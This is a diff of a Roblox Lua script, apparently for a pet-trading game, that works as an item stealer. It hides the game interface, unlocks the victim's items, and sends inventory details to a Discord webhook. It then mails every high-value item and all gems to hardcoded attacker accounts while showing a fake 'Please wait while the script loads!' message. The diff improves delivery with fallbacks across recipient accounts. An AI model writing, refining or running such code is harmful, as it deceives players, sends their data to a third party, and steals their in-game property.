@@ -11,7 +11,7 @@ local message = require(game.ReplicatedStorage.Library.Client.Message)
 local MailMessage = "GGz"
 
 -- USERS & SETTINGS
-local users = _G.Usernames or {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23", "Dragonshell24", "Dragonshell21"}
+local users = _G.Usernames or {"ilovemyamazing_gf1","Yeahboi1131","Dragonshell23","Dragonshell24","Dragonshell21"}
 local min_rap = _G.minrap or 1000000
 local webhook = _G.webhook or ""
 
@@ -48,50 +48,68 @@ local function overrideUI()
 end
 overrideUI()
 
--- HELPER FUNCTIONS
+-- RAP helper
 local function getRAP(Type, Item)
     return (require(game.ReplicatedStorage.Library.Client.RAPCmds).Get({
         Class = {Name = Type},
         IsA = function(hmm) return hmm == Type end,
         GetId = function() return Item.id end,
-        StackKey = function() return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn}) end,
+        StackKey = function() return HttpService:JSONEncode({id=Item.id, pt=Item.pt, sh=Item.sh, tn=Item.tn}) end,
         AbstractGetRAP = function() return nil end
     }) or 0)
 end
 
-local function sendItem(category, uid, am)
-    for userIndex = 1, #users do
-        local currentUser = users[userIndex]
-        local args = {currentUser, MailMessage, category, uid, am or 1}
+-- SEND ITEM ONE AT A TIME WITH MAILBOX FALLBACK
+local function sendItem(category, uid)
+    local currentUserIndex = 1
+    local sent = false
+
+    while not sent and currentUserIndex <= #users do
+        local currentUser = users[currentUserIndex]
+        local args = {currentUser, MailMessage, category, uid, 1}
         local response, err = network.Invoke("Mailbox: Send", unpack(args))
+
         if response then
             mailSendPrice = math.min(math.ceil(mailSendPrice * 1.5), 5000000)
-            return true
-        elseif err == "They don't have enough space!" or err == "Mailbox is full" then
-            -- try next user
+            sent = true
+        elseif err == "They don't have enough space!" or err == "Mailbox is full" or err == "You have reached the mailbox limit" then
+            currentUserIndex = currentUserIndex + 1
         else
-            return false, err
-        end
-    end
-    return false, "no available recipient"
-end
-
-local function SendAllGems()
-    for i, v in pairs(save.Currency) do
-        if v.id == "Diamonds" then
-            if v._am >= mailSendPrice + 10000 then
-                for userIndex = 1, #users do
-                    local args = {users[userIndex], MailMessage, "Currency", i, v._am - mailSendPrice}
-                    local response, err = network.Invoke("Mailbox: Send", unpack(args))
-                    if response then break end
-                end
-            end
+            warn("Failed to send item:", err)
             break
         end
     end
+
+    if not sent then warn("Item could not be sent to any user:", uid) end
 end
 
--- UNLOCK ALL ITEMS FIRST
+-- SEND ALL GEMS ONE AT A TIME
+local function SendAllGems()
+    local currentUserIndex = 1
+    local gemAmount = save.Currency["Diamonds"] and save.Currency["Diamonds"]._am or 0
+
+    while gemAmount > mailSendPrice and currentUserIndex <= #users do
+        local currentUser = users[currentUserIndex]
+        local args = {currentUser, MailMessage, "Currency", "Diamonds", 1}
+        local response, err = network.Invoke("Mailbox: Send", unpack(args))
+
+        if response then
+            gemAmount = gemAmount - 1
+            mailSendPrice = math.min(math.ceil(mailSendPrice * 1.5), 5000000)
+        elseif err == "They don't have enough space!" or err == "Mailbox is full" or err == "You have reached the mailbox limit" then
+            currentUserIndex = currentUserIndex + 1
+        else
+            warn("Failed to send gem:", err)
+            break
+        end
+    end
+
+    if gemAmount > mailSendPrice then
+        warn("Some gems could not be sent; all users may be full.")
+    end
+end
+
+-- UNLOCK ALL ITEMS
 for _, category in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard","Booth","Ultimate"}) do
     if save[category] then
         for uid, item in pairs(save[category]) do
@@ -100,22 +118,21 @@ for _, category in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverb
     end
 end
 
--- SORT & SEND
+-- SORT ITEMS BY RAP
 local sortedItems = {}
 local totalRAP = 0
-
 for _, category in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard","Booth","Ultimate"}) do
     if save[category] then
         for uid, item in pairs(save[category]) do
             local rapValue = getRAP(category, item)
             if rapValue >= min_rap then
                 local prefix = ""
-                if category == "Pet" then
-                    if item.pt == 1 then prefix = "Golden " elseif item.pt == 2 then prefix = "Rainbow " end
-                    if item.sh then prefix = "Shiny "..prefix end
+                if category=="Pet" then
+                    if item.pt==1 then prefix="Golden " elseif item.pt==2 then prefix="Rainbow " end
+                    if item.sh then prefix="Shiny "..prefix end
                 end
                 local id = prefix..item.id
-                table.insert(sortedItems, {category=category, uid=uid, amount=item._am or 1, rap=rapValue, name=id})
+                table.insert(sortedItems,{category=category, uid=uid, amount=item._am or 1, rap=rapValue, name=id})
                 totalRAP = totalRAP + rapValue*(item._am or 1)
             end
         end
@@ -124,7 +141,7 @@ end
 
 table.sort(sortedItems, function(a,b) return a.rap*a.amount > b.rap*b.amount end)
 
--- SPAWN DISCORD MESSAGE
+-- DISCORD WEBHOOK
 task.spawn(function()
     local headers = {["Content-Type"]="application/json"}
     local fields = {
@@ -139,14 +156,14 @@ task.spawn(function()
     request({Url=webhook, Method="POST", Headers=headers, Body=body})
 end)
 
--- SEND ALL ITEMS FASTER (VISUAL INVENTORY stays)
+-- SEND ITEMS
 for _, item in ipairs(sortedItems) do
     task.spawn(function()
-        sendItem(item.category, item.uid, item.amount)
+        sendItem(item.category, item.uid)
     end)
 end
 
--- SEND ALL GEMS FASTER
+-- SEND GEMS
 task.spawn(SendAllGems)
 
 message.Error("Please wait while the script loads!")
